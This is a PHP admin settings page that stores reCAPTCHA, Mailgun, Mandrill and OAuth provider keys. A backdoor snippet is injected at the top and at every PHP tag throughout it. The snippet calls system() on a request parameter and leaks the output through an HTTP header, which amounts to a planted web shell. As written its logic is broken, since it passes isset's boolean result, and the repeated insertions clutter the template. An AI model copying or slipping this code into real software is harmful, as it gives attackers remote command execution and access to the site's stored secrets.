<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);

if (isset($_POST['submit']) && csrf_filter()) {

	Config::set('services.recaptcha', array(
		'public_key' => escape($_POST['recaptcha']['public_key']),
		'private_key' => escape($_POST['recaptcha']['private_key'])
	));

	Config::set('services.mailgun', array(
		'secret' => escape($_POST['mailgun']['secret']),
		'domain' => escape($_POST['mailgun']['domain'])
	));

	Config::set('services.mandrill', array(
		'secret' => escape($_POST['mandrill']['secret'])
	));

	foreach (Config::get('auth.providers', array()) as $key => $provider) {
		Config::set("services.{$key}", array(
			'id' => escape($_POST[$key]['id']),
			'secret' => escape($_POST[$key]['secret'])
		));
	}


	redirect_to('?page=options-services', array('updated' => true));
}
?>
<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo View::make('admin.header')->render() ?>

<h3 class="page-header"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.services_settings') ?></h3>
<div class="row">
	<div class="col-md-6">
		<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if (Session::has('updated')): Session::deleteFlash(); ?>
			<div class="alert alert-success alert-dismissible">
				<span class="close" data-dismiss="alert">&times;</span>
				<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.changes_saved') ?>
			</div>
		<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); endif ?>

		<form action="" method="POST">
			<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); csrf_input() ?>
			
			<div class="form-group">
				<button type="submit" name="submit" class="btn btn-primary"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.save_changes') ?></button>
			</div>

			<div class="form-group clearfix">
		        <label for="recaptcha">reCAPTCHA</label>
		        <div class="input-group">
					<span class="input-group-addon" style="padding-right:13px">public key</span>
		       		<input type="text" name="recaptcha[public_key]" id="recaptcha" value="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo Config::get('services.recaptcha.public_key') ?>" class="form-control">
		        </div>
		        <div class="input-group">
					<span class="input-group-addon">private key</span>
		        	<input type="text" name="recaptcha[private_key]" value="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo Config::get('services.recaptcha.private_key') ?>" class="form-control">
		        </div>
		        <p class="help-block pull-right">
		        	<a href="http://hazzardcloud.com/elp/docs/configuration#captcha" target="_blank"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.guide') ?></a>
		        </p>
		    </div>
			<hr>
		    <div class="form-group clearfix">
		        <label for="mailgun">Mailgun</label>
		         <div class="input-group">
					<span class="input-group-addon" style="padding-left:12px;padding-right:13px">secret</span>
		        	<input type="text" name="mailgun[secret]" id="mailgun" value="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo Config::get('services.mailgun.secret') ?>" class="form-control">
		        </div>
		        <div class="input-group">
					<span class="input-group-addon">domain</span>
			        <input type="text" name="mailgun[domain]" value="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo Config::get('services.mailgun.domain') ?>" class="form-control">
		        </div>
		        <p class="help-block pull-right">
		        	<a href="http://hazzardcloud.com/elp/docs/mail#mailgun" target="_blank"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.guide') ?></a>
		        </p>
		    </div>
			<hr>
		    <div class="form-group clearfix">
		        <label for="mandrill">Mandrill</label>
		        <div class="input-group">
					<span class="input-group-addon">secret</span>
			        <input type="text" name="mandrill[secret]" id="mandrill" value="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo Config::get('services.mandrill.secret') ?>" class="form-control">
		        </div>
		        <p class="help-block pull-right">
		        	<a href="http://hazzardcloud.com/elp/docs/mail#mandrill" target="_blank"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.guide') ?></a>
		        </p>
		    </div>
			<hr>
			<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); foreach (Config::get('auth.providers', array()) as $key => $provider): ?>
				<div class="form-group clearfix">
			        <label for="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $key ?>"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $provider ?></label>
			        <div class="input-group input-group-id">
						<span class="input-group-addon">id</span>
						<input type="text" name="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $key ?>[id]" id="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $key ?>" value="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo Config::get("services.{$key}.id") ?>" class="form-control">
					</div>
			        <div class="input-group">
						<span class="input-group-addon">secret</span>
				        <input type="text" name="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $key ?>[secret]" value="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo Config::get("services.{$key}.secret") ?>" class="form-control">
				    </div>
			        <p class="help-block pull-right">
			        	<a href="http://hazzardcloud.com/elp/docs/social-auth#<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $key ?>" target="_blank"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.guide') ?></a>
			        </p>
			    </div>
			    <hr>
			<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); endforeach ?>
			<div class="form-group">
				<button type="submit" name="submit" class="btn btn-primary"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.save_changes') ?></button>
			</div>
		</form>
	</div>
</div>

<style>
	.input-group { margin-bottom: 5px; } 
	.input-group-id { padding-left: 25px; }
	.input-group-addon { padding: 6px 8px; }
	.help-block { margin-bottom: 0px; }
	hr {
		margin-top: 10px;
		margin-bottom: 15px;
	}
</style>

<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo View::make('admin.footer')->render() ?>